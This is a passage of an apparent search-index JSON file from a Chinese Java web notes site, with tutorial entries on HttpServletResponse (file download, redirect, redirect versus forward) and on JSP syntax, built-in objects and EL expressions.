\u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8f93\u5165\u6d41\u548cOutputStream\u5bf9\u8c61 FileInputStream fis = new FileInputStream ( filepath ); ServletOutputStream outputStream = resp . getOutputStream (); // \u521b\u5efabuffer\u7f13\u51b2\u533a int len = 0 ; byte [] buffer = new byte [ 1024 ] ; // \u5c06FileOutputStream\u6d41\u5199\u5165buffer\u7f13\u51b2\u533a\uff0c\u518d\u5c06\u5176\u8f93\u51fa\u5230\u5ba2\u6237\u7aef while (( len = fis . read ( buffer )) != - 1 ) { outputStream . write ( buffer , 0 , len ); } fis . close (); outputStream . close (); } } \u91cd\u5b9a\u5411 # package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class RedirectServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { /* \u7b49\u4ef7\u4e8e\u4e0b\u9762\u7684\u65b9\u5f0f resp.setHeader(\"Location\", \"/servlet_01/hello\"); resp.setStatus(302); */ resp . sendRedirect ( \"/servlet_01/hello\" ); } } \u91cd\u5b9a\u5411\u548c\u8f6c\u53d1\u7684\u533a\u522b # \u91cd\u5b9a\u5411 \u8f6c\u53d1 \u8f6c\u53d1\u662f\u5728\u670d\u52a1\u5668\u7aef\u5b8c\u6210\u7684\uff0c\u91cd\u5b9a\u5411\u662f\u5728\u5ba2\u6237\u7aef\u53d1\u751f\u7684\u3002 \u8f6c\u53d1\u7684\u901f\u5ea6\u5feb\uff0c\u91cd\u5b9a\u5411\u901f\u5ea6\u6162\u3002 \u8f6c\u53d1\u662f\u540c\u4e00\u6b21\u8bf7\u6c42\uff0c\u91cd\u5b9a\u5411\u662f\u4e24\u6b21\u8bf7\u6c42\u3002 \u8f6c\u53d1\u5730\u5740\u680f\u6ca1\u6709\u53d8\u5316\uff0c\u91cd\u5b9a\u5411\u5730\u5740\u680f\u6709\u53d8\u5316\u3002 \u8f6c\u53d1\u5fc5\u987b\u662f\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0b\u5b8c\u6210\uff0c\u91cd\u5b9a\u5411\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u670d\u52a1\u5668\u4e0b\u5b8c\u6210\u3002 \u91cd\u5b9a\u5411\u7684\u6839\u76ee\u5f55\u5728webapps\u6839\u76ee\u5f55\uff0c\u8f6c\u53d1\u7684\u6839\u76ee\u5f55\u5728\u5f53\u524d\u5e94\u7528\u7a0b\u5e8f\u7684\u6839\u76ee\u5f55\u3002 \u603b\u7ed3 # \u672c\u8282\u4e3b\u8981\u8bb2\u4e86HttpServletReponse\u7c7b\u7684\u4f7f\u7528\u3002","title":"HttpServletResponse"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#httpservletresponse","text":"web\u670d\u52a1\u5668\u63a5\u6536\u5230\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u540e\uff0c\u4f1a\u5c01\u88c5\u4e00\u4e2aHttpServletRequest\u548cHttpServletResponse","title":"HttpServletResponse"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#httpservletresponse\u4e2d\u7684\u65b9\u6cd5","text":"","title":"HttpServletResponse\u4e2d\u7684\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u83b7\u53d6\u8f93\u51fa\u54cd\u5e94\u5bf9\u8c61","text":"public ServletOutputStream getOutputStream () throws IOException ; public PrintWriter getWriter () throws IOException ;","title":"\u83b7\u53d6\u8f93\u51fa\u54cd\u5e94\u5bf9\u8c61"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u8bbe\u7f6e\u54cd\u5e94\u4fe1\u606f","text":"public void setCharacterEncoding ( String charset ); public void setContentLength ( int len ); public void setContentLengthLong ( long len ); public void setContentType ( String type ); public void addCookie ( Cookie cookie ); public void setDateHeader ( String name , long date ); public void addDateHeader ( String name , long date ); public void setHeader ( String name , String value ); public void addHeader ( String name , String value ); public void setIntHeader ( String name , int value ); public void addIntHeader ( String name , int value ); public void setStatus ( int sc ); public void sendError ( int sc , String msg ) throws IOException ; public void sendRedirect ( String location ) throws IOException ;","title":"\u8bbe\u7f6e\u54cd\u5e94\u4fe1\u606f"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u83b7\u53d6\u54cd\u5e94\u4fe1\u606f","text":"public int getStatus (); public String getHeader ( String name ); public Collection < String > getHeaders ( String name ); public Collection < String > getHeaderNames (); public String getCharacterEncoding (); public String getContentType ();","title":"\u83b7\u53d6\u54cd\u5e94\u4fe1\u606f"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u5176\u4ed6","text":"public String encodeURL ( String url ); public String encodeRedirectURL ( String url );","title":"\u5176\u4ed6"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u5e38\u89c1\u5e94\u7528","text":"","title":"\u5e38\u89c1\u5e94\u7528"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u8f93\u51fa\u54cd\u5e94\u672c\u4f53","text":"\u4f7f\u7528 getOutputStream \u6216 getWriter \u83b7\u53d6\u8f93\u51fa\u54cd\u5e94\u5bf9\u8c61\u4e4b\u540e\u5c31\u53ef\u4ee5\u8f93\u51fa\u54cd\u5e94\u672c\u4f53\u4e86\u3002","title":"\u8f93\u51fa\u54cd\u5e94\u672c\u4f53"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u4e0b\u8f7d\u6587\u4ef6","text":"\u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8def\u5f84\u548c\u6587\u4ef6\u540d \u8bbe\u7f6e\u54cd\u5e94\u5934 \u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8f93\u5165\u6d41\u548cOutputStream\u5bf9\u8c61 \u521b\u5efabuffer\u7f13\u51b2\u533a \u5c06FileOutputStream\u6d41\u5199\u5165buffer\u7f13\u51b2\u533a\uff0c\u518d\u5c06\u5176\u8f93\u51fa\u5230\u5ba2\u6237\u7aef package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.ServletOutputStream ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.File ; import java.io.FileInputStream ; import java.io.IOException ; import java.io.PrintWriter ; import java.net.URLEncoder ; public class DownloadServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { // \u83b7\u53d6\u8d44\u6e90\u6587\u4ef6\u8def\u5f84 String filepath = this . getServletContext (). getRealPath ( \"/WEB-INF/classes/db.properties\" ); // \u83b7\u53d6\u6587\u4ef6\u540d File file = new File ( filepath ); String fileName = file . getName (); // \u8bbe\u7f6e\u54cd\u5e94\u5934\uff0c\u8fd9\u91cc\u8981\u5c06filename\u7f16\u7801\u4e00\u4e0b\u4ee5\u652f\u6301\u4e2d\u6587\u540d resp . setHeader ( \"Content-Disposition\" , \"attachment;filename=\" + URLEncoder . encode ( fileName , \"UTF-8\" )); resp . setHeader ( \"Content-Length\" , String . valueOf ( file . length ())); // \u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8f93\u5165\u6d41\u548cOutputStream\u5bf9\u8c61 FileInputStream fis = new FileInputStream ( filepath ); ServletOutputStream outputStream = resp . getOutputStream (); // \u521b\u5efabuffer\u7f13\u51b2\u533a int len = 0 ; byte [] buffer = new byte [ 1024 ] ; // \u5c06FileOutputStream\u6d41\u5199\u5165buffer\u7f13\u51b2\u533a\uff0c\u518d\u5c06\u5176\u8f93\u51fa\u5230\u5ba2\u6237\u7aef while (( len = fis . read ( buffer )) != - 1 ) { outputStream . write ( buffer , 0 , len ); } fis . close (); outputStream . close (); } }","title":"\u4e0b\u8f7d\u6587\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u91cd\u5b9a\u5411","text":"package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class RedirectServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { /* \u7b49\u4ef7\u4e8e\u4e0b\u9762\u7684\u65b9\u5f0f resp.setHeader(\"Location\", \"/servlet_01/hello\"); resp.setStatus(302); */ resp . sendRedirect ( \"/servlet_01/hello\" ); } }","title":"\u91cd\u5b9a\u5411"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u91cd\u5b9a\u5411\u548c\u8f6c\u53d1\u7684\u533a\u522b","text":"\u91cd\u5b9a\u5411 \u8f6c\u53d1 \u8f6c\u53d1\u662f\u5728\u670d\u52a1\u5668\u7aef\u5b8c\u6210\u7684\uff0c\u91cd\u5b9a\u5411\u662f\u5728\u5ba2\u6237\u7aef\u53d1\u751f\u7684\u3002 \u8f6c\u53d1\u7684\u901f\u5ea6\u5feb\uff0c\u91cd\u5b9a\u5411\u901f\u5ea6\u6162\u3002 \u8f6c\u53d1\u662f\u540c\u4e00\u6b21\u8bf7\u6c42\uff0c\u91cd\u5b9a\u5411\u662f\u4e24\u6b21\u8bf7\u6c42\u3002 \u8f6c\u53d1\u5730\u5740\u680f\u6ca1\u6709\u53d8\u5316\uff0c\u91cd\u5b9a\u5411\u5730\u5740\u680f\u6709\u53d8\u5316\u3002 \u8f6c\u53d1\u5fc5\u987b\u662f\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0b\u5b8c\u6210\uff0c\u91cd\u5b9a\u5411\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u670d\u52a1\u5668\u4e0b\u5b8c\u6210\u3002 \u91cd\u5b9a\u5411\u7684\u6839\u76ee\u5f55\u5728webapps\u6839\u76ee\u5f55\uff0c\u8f6c\u53d1\u7684\u6839\u76ee\u5f55\u5728\u5f53\u524d\u5e94\u7528\u7a0b\u5e8f\u7684\u6839\u76ee\u5f55\u3002","title":"\u91cd\u5b9a\u5411\u548c\u8f6c\u53d1\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u603b\u7ed3","text":"\u672c\u8282\u4e3b\u8981\u8bb2\u4e86HttpServletReponse\u7c7b\u7684\u4f7f\u7528\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/","tags":["java"],"text":"JSP # \u6458\u81ea \u83dc\u9e1f\u6559\u7a0b - JSP\u7b80\u4ecb JSP\u5373Java Server Pages\uff0c\u662f\u4e00\u79cd\u52a8\u6001\u7f51\u9875\u5f00\u53d1\u6280\u672f\u3002\u5b83\u4f7f\u7528JSP\u6807\u7b7e\u5728HTML\u7f51\u9875\u4e2d\u63d2\u5165Java\u4ee3\u7801\u3002\u6807\u7b7e\u901a\u5e38\u4ee5<%\u5f00\u5934\u4ee5%>\u7ed3\u675f\u3002 JSP\u662f\u4e00\u79cdJava servlet\uff0c\u4e3b\u8981\u7528\u4e8e\u5b9e\u73b0Java web\u5e94\u7528\u7a0b\u5e8f\u7684\u7528\u6237\u754c\u9762\u90e8\u5206\u3002\u7f51\u9875\u5f00\u53d1\u8005\u4eec\u901a\u8fc7\u7ed3\u5408HTML\u4ee3\u7801\u3001XHTML\u4ee3\u7801\u3001XML\u5143\u7d20\u4ee5\u53ca\u5d4c\u5165JSP\u64cd\u4f5c\u548c\u547d\u4ee4\u6765\u7f16\u5199JSP\u3002 JSP\u539f\u7406 # \u5f53\u6211\u4eec\u8bbf\u95ee\u5bf9\u5e94\u9875\u9762\u7684\u65f6\u5019\uff0c\u5728 tomcat/work \u76ee\u5f55\u4e0b\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u8bbf\u95ee\u7684jsp\u9875\u9762\u4f1a\u751f\u6210\u5bf9\u5e94\u7684java\u7a0b\u5e8f\uff0cJSP\u6700\u7ec8\u4f1a\u8f6c\u6362\u6210Servlet\uff0c\u6d4f\u89c8\u5668\u6700\u540e\u8bbf\u95ee\u7684\u5176\u5b9e\u662fServlet\u3002 // \u521d\u59cb\u5316 public void _jspInit () { } // \u9500\u6bc1 public void _jspDestroy () { } //JSP Service public void _jspService ( final javax . servlet . http . HttpServletRequest request , final javax . servlet . http . HttpServletResponse response ) throws java . io . IOException , javax . servlet . ServletException { } 1. \u5224\u65ad\u8bf7\u6c42 2. \u5185\u7f6e\u4e00\u4e9b\u5bf9\u8c61 final javax . servlet . jsp . PageContext pageContext ; // \u9875\u9762\u4e0a\u4e0b\u6587 javax . servlet . http . HttpSession session = null ; // session final javax . servlet . ServletContext application ; // Servlet\u4e0a\u4e0b\u6587 final javax . servlet . ServletConfig config ; // config javax . servlet . jsp . JspWriter out = null ; // out final java . lang . Object page = this ; // \u5f53\u524d\u9875 javax . servlet . jsp . JspWriter _jspx_out = null ; javax . servlet . jsp . PageContext _jspx_page_context = null ; HttpServletRequest request // \u8bf7\u6c42 HttpServletResponse response // \u54cd\u5e94 3. \u7ed9\u5bf9\u8c61\u8d4b\u503c response . setContentType ( \"text/html\" ); pageContext = _jspxFactory . getPageContext ( this , request , response , null , true , 8192 , true ); _jspx_page_context = pageContext ; application = pageContext . getServletContext (); config = pageContext . getServletConfig (); session = pageContext . getSession (); out = pageContext . getOut (); _jspx_out = out ; 4. \u4ee5\u4e0a\u5bf9\u8c61\u53ef\u4ee5\u5728jsp\u9875\u9762\u4e2d\u76f4\u63a5\u4f7f\u7528 JSP\u57fa\u7840\u8bed\u6cd5 # \u5bfc\u5165\u4f9d\u8d56 # JSTL(JSP\u6807\u51c6\u6807\u7b7e\u5e93)\u662f\u4e00\u4e2aJSP\u6807\u7b7e\u96c6\u5408\uff0c\u5b83\u5c01\u88c5\u4e86JSP\u5e94\u7528\u7684\u901a\u7528\u6838\u5fc3\u529f\u80fd\u3002 <dependency> <groupId> javax.servlet.jsp.jstl </groupId> <artifactId> jstl </artifactId> <version> 1.2 </version> </dependency> \u4e2d\u6587\u4e71\u7801\u95ee\u9898 # <%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%> \u57fa\u7840\u8bed\u6cd5 # jsp\u4e0d\u4ec5\u652f\u6301java\u7684\u5168\u90e8\u8bed\u6cd5\uff0c\u800c\u4e14\u6709\u81ea\u5df1\u7684\u6269\u5145\u8bed\u6cd5\uff0c\u6458\u81ea JSP\u8bed\u6cd5 - \u83dc\u9e1f\u6559\u7a0b \u811a\u672c\u7a0b\u5e8f # <% java\u4ee3\u7801\u7247\u6bb5 %> \u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u7684JAVA\u8bed\u53e5 JSP\u8868\u8fbe\u5f0f # <%= java\u4ee3\u7801\u7247\u6bb5 %> JSP\u8868\u8fbe\u5f0f\uff0c\u4f1a\u5c06\u8ba1\u7b97\u5f97\u5230\u7684\u8868\u8fbe\u5f0f\u76f4\u63a5\u8f93\u51fa JSP\u58f0\u660e # <%! \u58f0\u660e %> JSP\u58f0\u660e\uff0c\u4e00\u4e2a\u58f0\u660e\u8bed\u53e5\u53ef\u4ee5\u58f0\u660e\u4e00\u4e2a\u6216\u591a\u4e2a\u53d8\u91cf\u3001\u65b9\u6cd5\uff0c\u4f9b\u540e\u9762\u7684Java\u4ee3\u7801\u4f7f\u7528\u3002 JSP\u6ce8\u91ca # <%-- \u6ce8\u91ca--%> JSP\u6307\u4ee4 # <%@ directive attribute=\"value\" %> JSP\u6307\u4ee4\u7528\u6765\u8bbe\u7f6e\u4e0e\u6574\u4e2aJSP\u9875\u9762\u76f8\u5173\u7684\u5c5e\u6027\u3002 \u8fd9\u91cc\u6709\u4e09\u79cd\u6307\u4ee4\u6807\u7b7e\uff1a \u6307\u4ee4 \u63cf\u8ff0 <%@ page ... %> \u5b9a\u4e49\u9875\u9762\u7684\u4f9d\u8d56\u5c5e\u6027\uff0c\u6bd4\u5982\u811a\u672c\u8bed\u8a00\u3001error\u9875\u9762\u3001\u7f13\u5b58\u9700\u6c42\u7b49\u7b49 <%@ include ... %> \u5305\u542b\u5176\u4ed6\u6587\u4ef6 <%@ taglib ... %> \u5f15\u5165\u6807\u7b7e\u5e93\u7684\u5b9a\u4e49\uff0c\u53ef\u4ee5\u662f\u81ea\u5b9a\u4e49\u6807\u7b7e \u81ea\u5b9a\u4e49\u9519\u8bef\u9875\u9762 # error/500.jsp <%@ page contentType = \"text/html;charset=UTF-8\" language = \"java\" %> <%@ page isErrorPage = \"true\" %> <html> <head> <title> 500 - Error </title> </head> <body> <p> 500 error! </p> </body> </html> index.jsp <%- - index . jsp -- %> <%@ page errorPage = \"error/500.jsp\" %> <html> <head> <title> Hello world </title> </head> <body> <h2> 111 </h2> <% int a = 1 / 0 ; %> </body> </html> \u6216\u8005\u5728web.iml\u4e2d\u5168\u5c40\u8bbe\u7f6e\u9519\u8bef\u9875\u9762 <error-page> <error-code> 404 </error-code> <location> /error/404.jsp </location> </error-page> \u5305\u542b\u5171\u6709\u6587\u4ef6 # common/header.jsp <%@ page contentType = \"text/html;charset=UTF-8\" language = \"java\" %> <p> this is header </p> common/footer.jsp <%@ page contentType = \"text/html;charset=UTF-8\" language = \"java\" %> <p> this is footer </p> index.jsp <%@ page errorPage = \"error/500.jsp\" %> <html> <head> <title> Hello world </title> </head> <body> <%@ include file = \"common/header.jsp\" %> <h2> content </h2> <%@ include file = \"common/footer.jsp\" %> </body> </html> \u503c\u5f97\u4e00\u63d0\u7684\u662f\u4f7f\u7528 <jsp:include page=\"\"/> \u4e5f\u53ef\u4ee5\u5b9e\u73b0\u4e00\u6837\u7684\u4e8b\u60c5\uff0c\u8fd9\u6807\u7b7e\u4e0e\u4e0a\u9762\u6807\u7b7e\u7684\u533a\u522b\u662f\u5e95\u5c42\u5b9e\u73b0\u4e0d\u540c\uff0c\u8be5\u6807\u7b7e\u5e95\u5c42\u901a\u8fc7\u62fc\u63a5\u9875\u9762\u5b9e\u73b0 \u4e5d\u5927\u5185\u7f6e\u5bf9\u8c61 # PageContext Request Response Session Application [ServletContext] config [ServletConfig] out page exception \u4f5c\u7528\u57df: - pageContext: \u53ea\u5728\u4e00\u4e2a\u9875\u9762\u4e2d\u6709\u6548 - request: \u53ea\u5728\u4e00\u6b21\u8bf7\u6c42\u4e2d\u6709\u6548 - session: \u53ea\u5728\u4e00\u6b21\u4f1a\u8bdd\u4e2d\u6709\u6548 - application: \u5728\u6574\u4e2a\u5e94\u7528\u4e2d\u6709\u6548 <%@ page contentType = \"text/html;charset=UTF-8\" language = \"java\" %> <html> <head> <title> Title </title> </head> <body> <% pageContext . setAttribute ( \"name1\" , \"test1\" ); // \u4fdd\u5b58\u7684\u6570\u636e\u53ea\u5728\u4e00\u4e2a\u9875\u9762\u6709\u6548 request . setAttribute ( \"name2\" , \"test2\" ); // \u4fdd\u5b58\u7684\u6570\u636e\u53ea\u5728\u4e00\u6b21\u8bf7\u6c42\u4e2d\u6709\u6548 session . setAttribute ( \"name3\" , \"test3\" ); // \u4fdd\u5b58\u7684\u6570\u636e\u53ea\u5728\u4e00\u6b21\u4f1a\u8bdd\u4e2d\u6709\u6548 application . setAttribute ( \"name4\" , \"test4\" ); // \u4fdd\u5b58\u7684\u6570\u636e\u5728\u6574\u4e2a\u5e94\u7528\u4e2d\u6709\u6548 %> <% // getAttribute\u548cfindAttribute\u7684\u533a\u522b: // getAttribute: \u5728page scope\u5185\u67e5\u627e\u4e0ename\u76f8\u5173\u7684\u5c5e\u6027\uff0c\u627e\u5230\u8fd4\u56de\u5c31\u8fd4\u56de\u5bf9\u8c61\uff0c\u627e\u4e0d\u5230\u5c31\u8fd4\u56denull\u3002 // findAttribute: \u4f9d\u6b21\u5728page\uff0crequest\uff0csession\uff08\u5982\u679c\u6709\u6548\u7684\u8bdd\uff09\u548capplication Scope\uff08\u8303\u56f4\uff09\u67e5\u627e\u4ee5name\u4e3a\u540d\u7684Attribute\uff0c\u627e\u5230\u5c31\u8fd4\u56de\u5bf9\u8c61\uff0c\u90fd\u627e\u4e0d\u5230\u8fd4\u56denull String name1 = ( String ) pageContext . getAttribute ( \"name1\" ); String name2 = ( String ) pageContext . findAttribute ( \"name2\" ); String name3 = ( String ) pageContext . findAttribute ( \"name3\" ); String name4 = ( String ) pageContext . findAttribute ( \"name4\" ); %> <h2> ${name1} </h2> <h2> ${name2} </h2> <h2> ${name3} </h2> <h2> ${name4} </h2> </body> </html> JSP\u6807\u7b7e # <jsp:action_name attribute=\"value\" /> \u884c\u4e3a\u6807\u7b7e\u57fa\u672c\u4e0a\u662f\u4e00\u4e9b\u9884\u5148\u5c31\u5b9a\u4e49\u597d\u7684\u51fd\u6570\uff0c\u4e0b\u8868\u7f57\u5217\u51fa\u4e86\u4e00\u4e9b\u53ef\u7528\u7684JSP\u884c\u4e3a\u6807\u7b7e: \u8bed\u6cd5 \u63cf\u8ff0 jsp:include \u7528\u4e8e\u5728\u5f53\u524d\u9875\u9762\u4e2d\u5305\u542b\u9759\u6001\u6216\u52a8\u6001\u8d44\u6e90 jsp:useBean \u5bfb\u627e\u548c\u521d\u59cb\u5316\u4e00\u4e2aJavaBean\u7ec4\u4ef6 jsp:setProperty \u8bbe\u7f6e JavaBean\u7ec4\u4ef6\u7684\u503c jsp:getProperty \u5c06 JavaBean\u7ec4\u4ef6\u7684\u503c\u63d2\u5165\u5230 output\u4e2d jsp:forward \u4ece\u4e00\u4e2aJSP\u6587\u4ef6\u5411\u53e6\u4e00\u4e2a\u6587\u4ef6\u4f20\u9012\u4e00\u4e2a\u5305\u542b\u7528\u6237\u8bf7\u6c42\u7684request\u5bf9\u8c61 jsp:plugin \u7528\u4e8e\u5728\u751f\u6210\u7684HTML\u9875\u9762\u4e2d\u5305\u542bApplet\u548cJavaBean\u5bf9\u8c61 jsp:element \u52a8\u6001\u521b\u5efa\u4e00\u4e2aXML\u5143\u7d20 jsp:attribute \u5b9a\u4e49\u52a8\u6001\u521b\u5efa\u7684XML\u5143\u7d20\u7684\u5c5e\u6027 jsp:body \u5b9a\u4e49\u52a8\u6001\u521b\u5efa\u7684XML\u5143\u7d20\u7684\u4e3b\u4f53 jsp:text \u7528\u4e8e\u5c01\u88c5\u6a21\u677f\u6570\u636e JSTL\u6807\u7b7e # \u5b89\u88c5\u548c\u914d\u7f6e\u53c2\u8003 JSTL \u4f7f\u7528\u4e0d\u591a\uff0c\u7565 EL\u8868\u8fbe\u5f0f # \u7b80\u5355\u8bed\u6cd5: ${expr} \u3002\u5176\u4e2d\uff0cexpr\u6307\u7684\u662f\u8868\u8fbe\u5f0f\u3002\u5728JSP EL\u4e2d\u901a\u7528\u7684\u64cd\u4f5c\u7b26\u662f . \u548c {} \u3002\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u7b26\u5141\u8bb8\u60a8\u901a\u8fc7\u5185\u5d4c\u7684JSP\u5bf9\u8c61\u8bbf\u95ee\u5404\u79cd\u5404\u6837\u7684JavaBean\u5c5e\u6027\u3002 JSP EL\u652f\u6301\u4e0b\u8868\u5217\u51fa\u7684\u9690\u542b\u5bf9\u8c61\uff1a \u9690\u542b\u5bf9\u8c61 \u63cf\u8ff0 pageScope page \u4f5c\u7528\u57df requestScope request \u4f5c\u7528\u57df sessionScope session \u4f5c\u7528\u57df applicationScope application \u4f5c\u7528\u57df param Request \u5bf9\u8c61\u7684\u53c2\u6570\uff0c\u5b57\u7b26\u4e32 paramValues Request\u5bf9\u8c61\u7684\u53c2\u6570\uff0c\u5b57\u7b26\u4e32\u96c6\u5408 header HTTP \u4fe1\u606f\u5934\uff0c\u5b57\u7b26\u4e32 headerValues HTTP \u4fe1\u606f\u5934\uff0c\u5b57\u7b26\u4e32\u96c6\u5408 initParam \u4e0a\u4e0b\u6587\u521d\u59cb\u5316\u53c2\u6570 cookie Cookie\u503c pageContext \u5f53\u524d\u9875\u9762\u7684pageContext JSP\u7684\u7f3a\u70b9 # \u6458\u81ea \u77e5\u4e4e - # jsp\u4e3a\u4ec0\u4e48\u88ab\u6dd8\u6c70\u4e86\uff1f \u52a8\u6001\u8d44\u6e90\u548c\u9759\u6001\u8d44\u6e90\u5168\u90e8\u8026\u5408\u5728\u4e00\u8d77\uff0c\u65e0\u6cd5\u505a\u5230\u771f\u6b63\u7684\u52a8\u9759\u5206\u79bb\u3002\u670d\u52a1\u5668\u538b\u529b\u5927\uff0c\u56e0\u4e3a\u670d\u52a1\u5668\u4f1a\u6536\u5230\u5404\u79cdhttp\u8bf7\u6c42\uff0c\u4f8b\u5982css\u7684http\u8bf7\u6c42\uff0cjs\u7684\uff0c\u56fe\u7247\u7684\uff0c\u52a8\u6001\u4ee3\u7801\u7684\u7b49\u7b49\u3002\u4e00\u65e6\u670d\u52a1\u5668\u51fa\u73b0\u72b6\u51b5\uff0c\u524d\u540e\u53f0\u4e00\u8d77\u73a9\u5b8c\uff0c\u7528\u6237\u4f53\u9a8c\u6781\u5dee\u3002 \u524d\u7aef\u5de5\u7a0b\u5e08\u505a\u597dhtml\u540e\uff0c\u9700\u8981\u7531java\u5de5\u7a0b\u5e08\u6765\u5c06html\u4fee\u6539\u6210jsp\u9875\u9762\uff0c\u51fa\u9519\u7387\u8f83\u9ad8\uff08\u56e0\u4e3a\u9875\u9762\u4e2d\u7ecf\u5e38\u4f1a\u51fa\u73b0\u5927\u91cf\u7684js\u4ee3\u7801\uff09\uff0c\u4fee\u6539\u95ee\u9898\u65f6\u9700\u8981\u53cc\u65b9\u534f\u540c\u5f00\u53d1\uff0c\u6548\u7387\u4f4e\u4e0b\u3002 jsp\u5fc5\u987b\u8981\u5728\u652f\u6301java\u7684web\u670d\u52a1\u5668\u91cc\u8fd0\u884c\uff08\u4f8b\u5982tomcat\u7b49\uff09\uff0c\u65e0\u6cd5\u4f7f\u7528nginx\u7b49\uff08nginx\u636e\u8bf4\u5355\u5b9e\u4f8bhttp\u5e76\u53d1\u9ad8\u8fbe5w\uff0c\u8fd9\u4e2a\u4f18\u52bf\u8981\u7528\u4e0a\uff09\uff0c\u6027\u80fd\u63d0\u4e0d\u4e0a\u6765\u3002 \u7b2c\u4e00\u6b21\u8bf7\u6c42jsp\uff0c\u5fc5\u987b\u8981\u5728web\u670d\u52a1\u5668\u4e2d\u7f16\u8bd1\u6210servlet\uff0c\u7b2c\u4e00\u6b21\u8fd0\u884c\u4f1a\u8f83\u6162\u3002 \u6bcf\u6b21\u8bf7\u6c42jsp\u90fd\u662f\u8bbf\u95eeservlet\u518d\u7528\u8f93\u51fa\u6d41\u8f93\u51fa\u7684html\u9875\u9762\uff0c\u6548\u7387\u6ca1\u6709\u76f4\u63a5\u4f7f\u7528html\u9ad8\u3002 jsp\u5185\u6709\u8f83\u591a\u6807\u7b7e\u548c\u8868\u8fbe\u5f0f\uff0c\u524d\u7aef\u5de5\u7a0b\u5e08\u5728\u4fee\u6539\u9875\u9762\u65f6\u4f1a\u6349\u895f\u89c1\u8098\uff0c\u9047\u5230\u5f88\u591a\u75db\u70b9\u3002 \u5982\u679cjsp\u4e2d\u7684\u5185\u5bb9\u5f88\u591a\uff0c\u9875\u9762\u54cd\u5e94\u4f1a\u5f88\u6162\uff0c\u56e0\u4e3a\u662f\u540c\u6b65\u52a0\u8f7d\u3002 \u603b\u7ed3 # \u672c\u8282\u4e3b\u8981\u4ecb\u7ecd\u4e86JSP\u7684\u57fa\u7840\u8bed\u6cd5\uff0cJSTL\u6807\u7b7e\u548cEL\u8868\u8fbe\u5f0f\uff0c\u540c\u65f6\u8bf4\u660e\u4e86JSP\u88ab\u6dd8\u6c70\u7684\u539f\u56e0\u3002","title":"JSP"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#jsp","text":"\u6458\u81ea \u83dc\u9e1f\u6559\u7a0b - JSP\u7b80\u4ecb JSP\u5373Java Server Pages\uff0c\u662f\u4e00\u79cd\u52a8\u6001\u7f51\u9875\u5f00\u53d1\u6280\u672f\u3002\u5b83\u4f7f\u7528JSP\u6807\u7b7e\u5728HTML\u7f51\u9875\u4e2d\u63d2\u5165Java\u4ee3\u7801\u3002\u6807\u7b7e\u901a\u5e38\u4ee5<%\u5f00\u5934\u4ee5%>\u7ed3\u675f\u3002 JSP\u662f\u4e00\u79cdJava servlet\uff0c\u4e3b\u8981\u7528\u4e8e\u5b9e\u73b0Java web\u5e94\u7528\u7a0b\u5e8f\u7684\u7528\u6237\u754c\u9762\u90e8\u5206\u3002\u7f51\u9875\u5f00\u53d1\u8005\u4eec\u901a\u8fc7\u7ed3\u5408HTML\u4ee3\u7801\u3001XHTML\u4ee3\u7801\u3001XML\u5143\u7d20\u4ee5\u53ca\u5d4c\u5165JSP\u64cd\u4f5c\u548c\u547d\u4ee4\u6765\u7f16\u5199JSP\u3002","title":"JSP"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#jsp\u539f\u7406","text":"\u5f53\u6211\u4eec\u8bbf\u95ee\u5bf9\u5e94\u9875\u9762\u7684\u65f6\u5019\uff0c\u5728 tomcat/work 